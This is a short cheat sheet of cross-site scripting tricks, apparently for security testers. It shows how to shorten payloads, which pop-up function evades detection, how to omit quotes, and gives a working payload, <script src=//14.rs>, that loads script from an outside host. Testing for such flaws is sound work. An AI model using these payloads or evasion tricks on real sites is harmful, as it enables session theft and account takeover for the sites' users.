Awesome Tips & Tricks

http(s):// can be shortened to // or /\\ or \\.
document.cookie can be shortened to cookie. It applies to other DOM objects as well.
alert and other pop-up functions don't need a value, so stop doing alert('XSS') and start doing alert()
You can use // to close a tag instead of >.
I have found that confirm is the least detected pop-up function so stop using alert.
Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use <script src=//14.rs> instead of <script src="//14.rs">
The shortest independent XSS payload is script src=//14.rs (19 chars)
